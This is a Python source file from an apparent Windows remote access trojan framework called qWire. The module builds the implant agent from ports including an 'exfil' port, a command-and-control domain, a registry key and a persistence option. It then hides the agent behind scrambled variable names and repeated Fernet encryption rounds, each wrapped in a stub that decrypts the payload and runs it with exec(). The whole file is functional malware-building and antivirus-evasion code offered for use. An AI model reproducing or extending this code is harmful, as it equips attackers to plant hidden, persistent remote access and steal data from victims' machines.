#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.1
# -------------------------------------------------------------
from ..builder.stub import QWireAgent
from ..builder.encryption import Scrambler,Crypter
from ..utils.file_paths import BuilderPath,CFGFilePath
from ..utils.utils import Validation,Notifications
from ..logging.logging import LoggingUtilitys

class AgentWriter():

    #Function will write the raw agent source code with the variables, classes, functions scrambled and return the build path
    def write_raw_agent_script(self,server_port,stream_port,exfil_port,domain_name,file_name,reg_key,persistence_option):
        port_array = [server_port,stream_port,exfil_port]           #Array for ports
        for port in port_array:                                     #For each port in the array
            #print(port)
            if Validation().Validate_port_number(port) == False:    #If the port is false
                return                                              #Return to the calling function and dont run the rest of the code
        if Validation().validate_extention(file_name,'py') == False:#If the file name does not have the .py extention,
            file_name = f'{file_name}.py'                           #append the .py exntention
        raw_agent_code = QWireAgent().generate_agent_code(server_port, stream_port, exfil_port, domain_name, reg_key, persistence_option)    #Get the raw agent code
        build_path = f'{BuilderPath().raw_script_dir}/{file_name}'             #Get the build path
        LoggingUtilitys().write_data_to_file(build_path,raw_agent_code)        #Write the data to the file
        return build_path                                                      #Return the build path

class Builder():

    #Function will create a new stub for encrypting a file
    def create_new_stub(self,key, encrypted_data, input_file):
        try:       #Try to catch error
            self.variable_length = int(LoggingUtilitys().retrieve_file_data(CFGFilePath().var_len_file)) #Retrieve data from file as int
        except ValueError:  #If there's a value error, logically it will be an empty string
            self.variable_length = 32 #Set default value to 32 chars
        key_scrambled = Scrambler().scrambleVar(self.variable_length) #Scramble variable
        fernet_scrambled = Scrambler().scrambleVar(self.variable_length)#Scramble variable
        decrypter_scrambled = Scrambler().scrambleVar(self.variable_length)#Scramble variable
        crypted_data_scrambled = Scrambler().scrambleVar(self.variable_length)#Scramble variable
        decrypted_data = Scrambler().scrambleVar(self.variable_length)#Scramble variable
        decrypter_code = f"""
from cryptography.fernet import Fernet as {fernet_scrambled}
{key_scrambled} = {key}
{decrypter_scrambled} = {fernet_scrambled}({key_scrambled})
{crypted_data_scrambled} = {encrypted_data}
{decrypted_data} = {decrypter_scrambled}.decrypt({crypted_data_scrambled})
exec({decrypted_data})
        """
        LoggingUtilitys().write_data_to_file(input_file, decrypter_code) #write stub to output file

    #Function will iterate encryption scheme for further obfuscation
    def aes_128_encryption(self,output_file):
        crypter = Crypter()                     #Store crypter object in var
        encryption_rounds = LoggingUtilitys().retrieve_file_data(CFGFilePath().iterations_file) #Retrieve encryption rounds from settings
        if encryption_rounds == '':             #If the iterations file has not been set
            encryption_rounds = 5               #Set iterations for encryption to 5 by default
        for round in range(int(encryption_rounds)):                  #initiate encryption
            crypter.encrypt_file(output_file)   #Encrypt file
            self.create_new_stub(crypter.key,crypter.encrypted_data,output_file) #Write new stub with encrypted data

    #Function will create agent based on options received from builder gui
    def create_agent(self,
                  server_port,
                  stream_port,
                  exfil_port,
                  domain_name,
                  file_name,
                  reg_key,
                  persistence_option,
                  encryption_option):

        crypter = Crypter()     #Store crypter object in var
        build_path = AgentWriter().write_raw_agent_script(server_port,stream_port,exfil_port,domain_name,file_name,reg_key,persistence_option)  #Write initial agent and get the build path
        if encryption_option == True:                                                   #If encryption opt was selected
            crypter.encrypt_file(build_path)                                            #Encrypt the file,
            self.create_new_stub(crypter.key,crypter.encrypted_data,f"{build_path}")    #Create a new stub
            self.aes_128_encryption(build_path)                                         #Call the iterator
        Notifications().raise_notification(f'Successfully created stub.\nLocation: {build_path}', 'Success') #Notify user